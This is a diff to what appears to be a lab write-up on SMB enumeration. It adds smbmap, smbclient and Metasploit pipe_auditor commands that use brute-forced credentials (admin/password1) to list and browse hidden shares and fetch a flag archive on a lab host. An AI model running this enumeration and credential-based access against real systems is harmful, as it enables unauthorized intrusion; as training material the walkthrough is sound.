@@ -555,7 +555,7 @@ group:[Reserved] rid:[0x3ef]
 
 To get information about printer, we can use the following command:
 
-```
+```sh
 root@attackdefense:~# enum4linux -i 192.77.200.3
 .
 .
@@ -570,7 +570,7 @@ In this case, no printers are found.
 
 To connect with a share, as in my case I saw that the public was accessible. So we can use the following command to connect with the public:
 
-```
+```sh
 root@attackdefense:~# smbclient //192.77.200.3/public -N
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -584,7 +584,7 @@ smb: \> ls
 
 I found out that most of the commands in this are standard Linux commands. But some of the commands may not work in this scenario. For example, to read a file, we can't use `cat filename` a command. I used get command to download the file to my local system like this:
 
-```
+```sh
 smb: \secret\> get flag
 getting file \secret\flag of size 33 as flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
 ```
@@ -632,7 +632,108 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-28 07:12:
 </strong>1 of 1 target successfully completed, 1 valid password found
 </code></pre>
 
+To check if the password is correct or not, we can use `smbmap`:
 
+```sh
+root@attackdefense:~# smbmap -H 192.9.143.3 -u admin -p password1
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 192.9.143.3...
+[+] IP: 192.9.143.3:445 Name: target-1                                          
+        Disk                                                    Permissions
+        ----                                                    -----------
+        shawn                                                   READ, WRITE
+        nancy                                                   READ ONLY
+        admin                                                   READ, WRITE
+        IPC$                                                    NO ACCESS
+```
+
+Jane is not listed above, Let's try another method:
+
+```sh
+root@attackdefense:~# smbclient -L 192.9.143.3 -U jane
+Enter WORKGROUP\jane's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        shawn           Disk      
+        nancy           Disk      
+        admin           Disk      
+        IPC$            IPC       IPC Service (brute.samba.recon.lab)
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        RECONLABS            
+```
+
+Jane is still not there, Let's see if it is browsable:
+
+```sh
+root@attackdefense:~# smbclient //192.9.143.3/jane -U jane
+Enter WORKGROUP\jane's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Nov 27 19:25:12 2018
+  ..                                  D        0  Tue Nov 27 19:25:12 2018
+  logs                                D        0  Tue Nov 27 19:25:12 2018
+  flag                                D        0  Tue Nov 27 19:25:12 2018
+  admin                               D        0  Tue Nov 27 19:25:12 2018
+
+                1981084628 blocks of size 1024. 195512960 blocks available
+```
+
+Great! we can see that it is browsable even if it is not listed in the shares.
+
+Now let's try `admin` directory:
+
+```sh
+root@attackdefense:~# smbclient //192.9.143.3/admin -U admin
+Enter WORKGROUP\admin's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Dec 28 07:29:43 2023
+  ..                                  D        0  Tue Nov 27 19:25:12 2018
+  hidden                              D        0  Tue Nov 27 19:25:12 2018
+
+                1981084628 blocks of size 1024. 195512856 blocks available
+smb: \> cd hidden
+smb: \hidden\> ls
+  .                                   D        0  Tue Nov 27 19:25:12 2018
+  ..                                  D        0  Thu Dec 28 07:29:43 2023
+  flag.tar.gz                         N      151  Tue Nov 27 19:25:12 2018
+
+                1981084628 blocks of size 1024. 195512856 blocks available
+```
+
+Great! now we can download the file and view the information in our local system by unzipping it using the following command:
+
+```sh
+tar -xf flag.tar.gz
+```
+
+Now we're going to enumerate pipes using Metasploit:
+
+> In SMB (Server Message Block) protocol, pipes are a type of communication mechanism that enables inter-process communication between different processes running on a server. Pipes can be used to send various types of data and commands, including remote procedure calls (RPCs), file names and data, and messages between processes. In the context of SMB enumeration, identifying named pipes can be valuable as attackers can use them to gain access to sensitive information, execute commands, and perform other malicious activities.
+
+```sh
+msf5 > use auxiliary/scanner/smb/pipe_auditor 
+msf5 auxiliary(scanner/smb/pipe_auditor) > set smbuser admin
+smbuser => admin
+msf5 auxiliary(scanner/smb/pipe_auditor) > set smbpass password1
+smbpass => password1
+msf5 auxiliary(scanner/smb/pipe_auditor) > set rhosts 192.9.143.3
+rhosts => 192.9.143.3
+msf5 auxiliary(scanner/smb/pipe_auditor) > run
+
+[+] 192.9.143.3:139       - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
+[*] 192.9.143.3:          - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+Here we got a list of these named pipes.
 
 [^1]: 
 
